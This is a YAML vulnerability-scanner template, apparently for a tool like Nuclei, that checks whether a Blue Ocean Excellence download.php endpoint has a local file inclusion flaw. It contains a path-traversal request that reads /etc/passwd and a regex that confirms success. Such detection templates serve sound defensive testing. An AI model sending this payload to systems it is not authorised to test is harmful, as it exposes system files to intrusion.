id: "blue-ocean-excellence-lfi"
name: "Blue Ocean Excellence - Local File Inclusion"
severity: "high"
description: "Blue Ocean Excellence is vulnerable to local file inclusion."
tech:
  - "php"
tags:
  - "blue-ocean"
  - "lfi"
  - "vuln"
cwe: "CWE-23"
reference: "https://blog.csdn.net/qq_41901122/article/details/116786883"
spaExclusion: true
request:
  method: "GET"
  path: "/download.php?file=../../../../../etc/passwd"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "regex"
    part: "body"
    regex:
      - "toor:[x*]:0:0"
  - type: "status"
    status:
      - 200
